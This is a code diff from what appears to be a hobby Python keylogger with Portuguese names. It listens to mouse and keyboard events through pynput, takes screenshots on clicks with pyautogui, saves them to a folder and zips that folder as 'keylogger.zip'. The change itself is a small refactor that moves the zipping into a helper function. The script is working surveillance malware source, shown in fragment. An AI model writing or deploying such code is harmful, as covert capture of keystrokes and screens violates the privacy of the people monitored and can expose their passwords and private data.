@@ -2,7 +2,7 @@ from pynput.mouse import Listener as listaMouser
 from pynput.keyboard import Listener as listaTeclado
 from datetime import datetime as datahora
 import re as regetes, os as sistema , pyautogui as printTela
-from zipfile import ZipFile
+from zipfile import ZipFile as arquivoZip
 
 dataAtualSistema = datahora.now()
 data = dataAtualSistema.strftime("%d-%m")
@@ -44,8 +44,10 @@ def tirarPrint(x,y, botao, pressionado):
         print(horarioCaptura)
         capturaDeTela.save(sistema.path.join(pastaRaiz, "capturaDeTela_" + horarioCaptura + ".jpg"))
     
-    # Compactar a pasta em um arquivo zip
-    with ZipFile('keylogger.zip', 'w') as zip:
+    compactador()
+
+def compactador():
+    with arquivoZip('keylogger.zip', 'w') as zip:
         for file in sistema.listdir(pastaRaiz):
             zip.write(sistema.path.join(pastaRaiz, file))
 
